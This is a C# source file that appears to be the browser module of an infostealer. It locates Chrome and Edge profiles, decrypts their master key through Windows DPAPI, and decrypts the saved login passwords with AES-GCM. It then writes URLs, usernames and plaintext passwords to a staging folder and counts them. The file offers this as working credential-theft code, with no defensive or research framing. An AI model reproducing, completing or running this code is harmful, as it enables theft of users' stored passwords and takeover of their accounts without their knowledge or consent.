using Plexity.SL.Pass;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using AesGcm = Plexity.SL.Pass.AesGcm;

namespace Plexity.SL
{
    class Browser
    {
        public static string local = Environment.GetEnvironmentVariable("localappdata");
        public static string temp = Environment.GetEnvironmentVariable("temp");

        public static void SLPassword()
        {
            Dictionary<string, string> browsers = new Dictionary<string, string>
            {
                { "Chrome", Path.Combine(local, @"Google\Chrome\User Data") },
                { "Edge", Path.Combine(local, @"Microsoft\Edge\User Data") }
            };
            foreach (var browser in browsers)
            {
                List<string> collectedData = new List<string>();

                if (!Directory.Exists(browser.Value))
                    continue;

                string localState = SearchFiles(browser.Value, "Local State")[0];
                byte[] masterKey = GetMasterKey(localState);

                if (masterKey == null)
                    continue;

                foreach (var loginData in SearchFiles(browser.Value, "Login Data"))
                {
                    GetLogins(loginData, masterKey, collectedData);
                }
                Save(browser.Key, collectedData);
            }
        }


        public static void GetLogins(string loginData, byte[] masterKey, List<string> collectedData)
        {

            string randomPath = Path.Combine(temp, Path.GetRandomFileName());
            File.Copy(loginData, randomPath);

			SqlLite3Parser parser = new SqlLite3Parser(File.ReadAllBytes(randomPath));
            parser.ReadTable("logins");

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                byte[] password_buffer = parser.GetValue<byte[]>(i, "password_value");
                string username = parser.GetValue<string>(i, "username_value");
                string url = parser.GetValue<string>(i, "origin_url");

                if (password_buffer == null || username == null || url == null)
                {
                    continue;
                }
                try
                {
                    string password = Encoding.Default.GetString(DecryptWithKey(password_buffer, masterKey));


					collectedData.Add($"URL       : {url}");
                    collectedData.Add($"Username  : {username}");
                    collectedData.Add($"Password  : {password}");
					collectedData.Add("");

                }
                catch(Exception ex) { }
            }

        }
        public static void Save(string browser, List<string> collectedData)
        {
            var saveToDir = Path.Combine(Settings._tempDir, "Browser", browser);

            Directory.CreateDirectory(saveToDir);
            var savePath = Path.Combine(saveToDir, "Password.txt");
			File.WriteAllText(savePath, string.Join(Environment.NewLine, collectedData));

			Settings._passwordsCount += collectedData.Count;
        }
        public static List<string> SearchFiles(string path, string pattern)
        {
            var foundFiles = new HashSet<string>();

            try
            {
                var files = Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly);
                foreach (var file in files)
                    foundFiles.Add(file);

                var directories = Directory.GetDirectories(path);
                foreach (var directory in directories)
                {
                    try
                    {
                        var subDirFiles = SearchFiles(directory, pattern);
                        foreach (var file in subDirFiles)
                            foundFiles.Add(file);

                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch
            { }

            return foundFiles.ToList();
        }

        public static byte[] GetMasterKey(string path)
        {
            try
            {
                string randomPath = Path.Combine(temp, Path.GetRandomFileName());
                File.Copy(path, randomPath);
                string file = File.ReadAllText(randomPath);

                string pattern = @"""encrypted_key"":""([^""]+)""";

                Regex regex = new Regex(pattern);
                Match match = regex.Match(file);

                byte[] masterKey = Convert.FromBase64String(match.Groups[1].Value);

                byte[] rawMasterKey = new byte[masterKey.Length - 5];
                Array.Copy(masterKey, 5, rawMasterKey, 0, masterKey.Length - 5);
                byte[] decryptedData = ProtectedData.Unprotect(rawMasterKey, null, DataProtectionScope.CurrentUser);

                return decryptedData;
            }
            catch
            { }

            return null;

        }

        public static byte[] DecryptWithKey(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                Array.Copy(encryptedData, 3, bIV, 0, 12);
                byte[] buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16];
                byte[] data = new byte[buffer.Length - tag.Length];

                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);
                Array.Copy(buffer, 0, data, 0, buffer.Length - tag.Length);
                AesGcm decryptor = new AesGcm();

                return decryptor.Decrypt(masterKey, bIV, null, data, tag);
            }
            catch
            { }

            return null;

        }


    }
}
